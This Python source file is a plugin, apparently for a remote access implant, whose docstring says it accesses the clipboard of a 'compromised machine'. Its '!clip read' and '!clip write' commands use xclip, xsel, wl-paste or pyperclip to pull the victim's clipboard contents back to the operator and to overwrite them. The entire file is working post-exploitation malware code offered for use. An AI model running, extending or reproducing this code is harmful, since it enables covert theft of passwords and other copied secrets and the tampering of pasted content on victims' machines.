"""
Plugin !clip — accede al portapapeles de la máquina vulnerada.
!clip read          → lee el contenido actual del portapapeles
!clip write <texto> → escribe texto en el portapapeles
"""

import subprocess
import shutil


def _read_clipboard() -> tuple[bool, str]:
    for tool, args in [
        ("xclip",  ["xclip", "-selection", "clipboard", "-o"]),
        ("xsel",   ["xsel", "--clipboard", "--output"]),
        ("wl-paste", ["wl-paste"]),
    ]:
        if shutil.which(tool):
            try:
                r = subprocess.run(args, capture_output=True, text=True, timeout=5)
                if r.returncode == 0:
                    return True, r.stdout
            except Exception:
                continue
    try:
        import pyperclip
        return True, pyperclip.paste()
    except Exception:
        pass
    return False, ""


def _write_clipboard(text: str) -> tuple[bool, str]:
    for tool, args in [
        ("xclip",  ["xclip", "-selection", "clipboard"]),
        ("xsel",   ["xsel", "--clipboard", "--input"]),
        ("wl-copy", ["wl-copy"]),
    ]:
        if shutil.which(tool):
            try:
                r = subprocess.run(args, input=text, capture_output=True, text=True, timeout=5)
                if r.returncode == 0:
                    return True, tool
            except Exception:
                continue
    try:
        import pyperclip
        pyperclip.copy(text)
        return True, "pyperclip"
    except Exception:
        pass
    return False, ""


def run(args: str) -> tuple[int, str, str]:
    parts = args.strip().split(None, 1)
    if not parts:
        return 1, "", "uso: !clip read | write <texto>"

    cmd = parts[0].lower()

    if cmd == "read":
        ok, content = _read_clipboard()
        if not ok:
            return 1, "", "no se pudo leer el portapapeles (xclip/xsel/wl-paste/pyperclip requerido)"
        return 0, f"--- PORTAPAPELES ---\n{content or '(vacío)'}", ""

    if cmd == "write":
        text = parts[1] if len(parts) > 1 else ""
        if not text:
            return 1, "", "uso: !clip write <texto>"
        ok, tool = _write_clipboard(text)
        if not ok:
            return 1, "", "no se pudo escribir en el portapapeles"
        return 0, f"Portapapeles actualizado via {tool} ({len(text)} chars)", ""

    return 1, "", "uso: !clip read | write <texto>"
